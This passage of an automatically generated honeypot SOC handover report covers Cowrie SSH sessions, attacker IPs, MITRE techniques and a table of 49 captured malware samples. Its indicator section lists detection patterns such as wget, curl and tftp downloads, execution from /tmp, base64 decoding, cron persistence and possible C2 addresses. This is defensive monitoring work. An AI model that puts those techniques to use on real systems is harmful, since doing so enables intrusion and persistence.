- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0413bb900f86

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-29 16:53 |
| **Last Seen** | 2026-06-29 16:53 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:53:32` | `cowrie.session.connect` |
| `2026-06-29 16:53:33` | `cowrie.client.version` |
| `2026-06-29 16:53:33` | `cowrie.client.kex` |
| `2026-06-29 16:53:42` | `cowrie.login.success` |
| `2026-06-29 16:53:46` | `cowrie.session.params` |
| `2026-06-29 16:53:46` | `cowrie.command.input` |
| `2026-06-29 16:53:48` | `cowrie.log.closed` |
| `2026-06-29 16:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa82867ebd0b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-29 16:54 |
| **Last Seen** | 2026-06-29 16:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 16:54:08` | `cowrie.session.connect` |
| `2026-06-29 16:54:09` | `cowrie.client.version` |
| `2026-06-29 16:54:09` | `cowrie.client.kex` |
| `2026-06-29 16:54:11` | `cowrie.login.success` |
| `2026-06-29 16:54:12` | `cowrie.session.params` |
| `2026-06-29 16:54:12` | `cowrie.command.input` |
| `2026-06-29 16:54:13` | `cowrie.log.closed` |
| `2026-06-29 16:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.78.74[.]222` | **30** | 2026-06-29 15:30 | 2026-06-29 15:31 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `35.195.110[.]198` | **30** | 2026-06-29 15:01 | 2026-06-29 15:02 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.14.39[.]47` | **10** | 2026-06-29 15:44 | 2026-06-29 15:44 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `152.32.135[.]214` | **4** | 2026-06-29 16:24 | 2026-06-29 16:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | **3** | 2026-06-29 15:32 | 2026-06-29 16:53 | 2m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | **2** | 2026-06-29 16:16 | 2026-06-29 16:21 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.124.1[.]210` | 1 | 2026-06-29 16:04 | 2026-06-29 16:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.13[.]223` | 1 | 2026-06-29 16:53 | 2026-06-29 16:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.71[.]135` | 1 | 2026-06-29 15:03 | 2026-06-29 15:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.214.251[.]205` | 1 | 2026-06-29 15:03 | 2026-06-29 15:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.6.109[.]238` | 1 | 2026-06-29 15:27 | 2026-06-29 15:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.141[.]117` | 1 | 2026-06-29 15:24 | 2026-06-29 15:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `35.195.57[.]110` | 1 | 2026-06-29 15:44 | 2026-06-29 15:44 | 7s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]156` | 1 | 2026-06-29 16:45 | 2026-06-29 16:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]46` | 1 | 2026-06-29 15:18 | 2026-06-29 15:18 | 4s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 64/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 50/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 52/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 52/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 76/100 | 🔴 HIGH | **17/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 52/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/75** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 51/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 50/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `d16bffbd3ba31504aea1fc01e66e29ad5927830ea5e2cc49369e82a7c68ec5c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `139.199.71[.]135` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 4 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `68.183.178[.]130` | SG | DigitalOcean, LLC | **100** ⚠️ | 40 |
| `172.245.252[.]130` | US | RackNerd LLC | **100** ⚠️ | 18 |
| `120.48.13[.]223` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 9 |
| `43.160.246[.]16` | SG | ACEVILLE PTE.LTD. | **100** ⚠️ | 1 |
| `158.178.141[.]210` | AU | Oracle Corporation | **100** ⚠️ | 2 |
| `35.195.57[.]110` | BE | Google LLC | **100** ⚠️ | 0 |
| `146.56.164[.]20` | KR | Oracle Corporation , Global software solutions , California , USA | **100** ⚠️ | 2 |
| `34.14.39[.]47` | BE | Google LLC | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 133 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 107 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 24 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 5 |

---

## 🔕 False Positive Summary (51 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 50 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 246 cases |
| Tool 34  | Credential Extractor        | ✅ 298 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 48 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 51 filtered (20.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 40 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 107 priority case(s) shown individually · 15 recon entry/entries in table (6 group(s) consolidating 79 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-29T18:12:14Z_
